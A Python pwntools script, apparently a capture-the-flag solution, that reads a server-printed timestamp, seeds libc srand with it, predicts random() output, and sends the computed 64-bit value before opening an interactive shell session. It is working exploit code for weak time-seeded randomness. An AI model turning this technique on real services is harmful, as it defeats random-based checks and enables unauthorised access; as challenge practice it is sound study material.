from pwn import *
from ctypes import CDLL

libc_obj=CDLL("/lib/x86_64-linux-gnu/libc.so.6")
if len(sys.argv)==1:
    p=process("linux_server64")
elif sys.argv[1]=="1":
    p=process("./bin")
elif sys.argv[1]=="2":
    context.log_level='debug'
    p=process("./bin")
else:
    context.log_level='debug'
    libc_obj=CDLL("../r64.libc.so.6")
    p=remote("functf",18015)

buf=p.recvuntil("Indian?\n")
print buf
buf=p.recvline()
strtime=buf[:-1]
print 'strtime:',strtime
seed_val = int( time.mktime(time.strptime(strtime,"%Y-%m-%d %H:%M:%S")) )
print 'seed_val:',hex(seed_val)

buf=p.recvuntil("'")
buf=p.recvuntil("'")

first_random=int(buf[:-1],10)
print 'first_random=',first_random,hex(first_random)
b=first_random<<32
print 'b=',b,hex(b)

libc_obj.srand(seed_val)
fake_first_random = libc_obj.random()
print 'fake_first_random',fake_first_random,hex(fake_first_random)
c2 = libc_obj.random()
print c2,hex(c2)


d=b+c2
print d,hex(d)
stra=p64(d)

payload=""
payload+=stra[0:0+1]
payload+=stra[1:1+1]
payload+=stra[2:2+1]
payload+=stra[3:3+1]
payload+=stra[4:4+1]
payload+=stra[5:5+1]
payload+=stra[6:6+1]
payload+=stra[7:7+1]
print hexdump(payload)
p.send(payload)
p.interactive()

